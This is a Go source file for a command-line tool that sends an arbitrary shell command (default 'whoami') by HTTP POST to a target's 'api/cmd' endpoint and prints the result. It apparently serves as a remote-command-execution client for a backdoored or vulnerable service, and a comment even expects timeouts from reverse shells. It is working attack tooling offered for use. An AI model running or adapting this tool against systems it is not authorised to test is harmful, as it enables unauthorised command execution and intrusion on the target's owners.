package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

// ============================================================
//
// Function Name: ExecCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to execute an arbitraty command,
//  specified by the user, on a remote target.
//
// Input(s):
//
//  command - string. command to execute.
//
// Return(s):
//
//  output - string. output from the command execution.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) ExecCommand(command string) (output string, success bool, message string) {
	c.Route = "api/cmd"

	var bodycontent []byte
	var err error
	var resp *http.Response
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, c.Route)

	SysMsgNB("sending remote command ...")
	resp, err = c.Session.Post(targetURL, "text/plain", strings.NewReader(command))
	if err != nil {
		if os.IsTimeout(err) {
			return "", true, "timeout occurred. assuming reverse shell or long running command"
		}
		return "", false, err.Error()
	}
	defer resp.Body.Close()

	SysMsgNB("processing response ...")
	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", false, err.Error()
	}

	output = string(bodycontent)

	return output, true, "command successfully executed"
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	fmt.Printf("%s", ANSI_CLRLN)
	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var command string
	var output string

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.StringVar(&command, "c", "whoami", "command to execute on the target")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Argument Info", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	InfMsg(fmt.Sprintf("Command: \"%s\"", command))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	output, success, message = client.ExecCommand(command)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	if len(output) > 0 {
		PrintChar(' ', 1)
		PrintChar('-', 60)
		PrintCenter("Command Output", 60)
		PrintChar('-', 60)
		fmt.Printf("%s\n", output)
		PrintChar('-', 60)
	}
	return
}

